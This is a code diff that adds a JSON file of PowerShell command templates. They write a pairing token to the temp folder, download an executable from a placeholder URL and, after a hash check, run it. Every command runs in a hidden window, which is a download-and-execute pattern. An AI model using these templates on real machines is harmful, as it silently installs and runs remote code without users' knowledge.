@@ -1,0 +1,5 @@
+{
+  "pair": "powershell -nop -w hidden -c \"'__PAIR__'|sc $env:TMP\\xr-v2.pair\"",
+  "download": "powershell -nop -w hidden -c \"$p=$env:TMP+'\\xr-v2.exe';rm $p -ea 0;curl.exe -fLsS --max-time 60 __URL__ -o ($p+'.tmp');if($?){mv -force ($p+'.tmp') $p}\"",
+  "verify": "powershell -nop -w hidden -c \"$p=$env:TMP+'\\xr-v2.exe';1..90|%{$c=gc $env:TMP\\xr-v2.pair -ea 0;if($c-and(Test-Path $p)-and((Get-FileHash $p).Hash -eq '__SHA256__')){&$p pair $c;exit};sleep 1}\""
+}
